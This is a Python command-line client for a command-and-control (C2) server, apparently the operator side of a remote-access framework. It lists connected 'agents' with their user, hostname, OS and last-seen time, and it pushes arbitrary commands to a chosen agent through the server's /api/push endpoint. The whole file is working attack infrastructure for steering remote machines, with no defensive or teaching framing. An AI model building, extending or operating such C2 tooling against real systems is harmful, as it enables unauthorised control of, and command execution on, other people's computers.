import argparse
import requests
import json

SERVER_URL = "http://127.0.0.1:5000"

def list_agents():
    r = requests.get(f"{SERVER_URL}/api/agents")
    r.raise_for_status()
    agents = r.json()

    if not agents:
        print("No agents registered")
        return

    for aid, meta in agents.items():
        print(f"{aid}")
        print(f"  user: {meta.get('user')}")
        print(f"  host: {meta.get('hostname')}")
        print(f"  os:   {meta.get('os')}")
        print(f"  last_seen: {meta.get('last_seen')}")
        print()
        
def push_task(agent_id, command):
    payload = {
        "id" : agent_id,
        "command" : command
        }
    r = requests.post(f"{SERVER_URL}/api/push", json=payload)
    r.raise_for_status()
    print(f"Task queued for {agent_id}")
    
    

def main():
    parser = argparse.ArgumentParser(description="C2 Operator CLI")
    sub = parser.add_subparsers(dest="cmd")
    
    sub.add_parser("agents")
    
    exec_p = sub.add_parser("exec")
    exec_p.add_argument("agent_id")
    exec_p.add_argument("command")

    args = parser.parse_args()

    if args.cmd == "agents":
        list_agents()
    elif args.cmd == "exec":
        push_task(args.agent_id, args.command)
    else:
        parser.print_help()
        
if __name__ == "__main__":
    main()


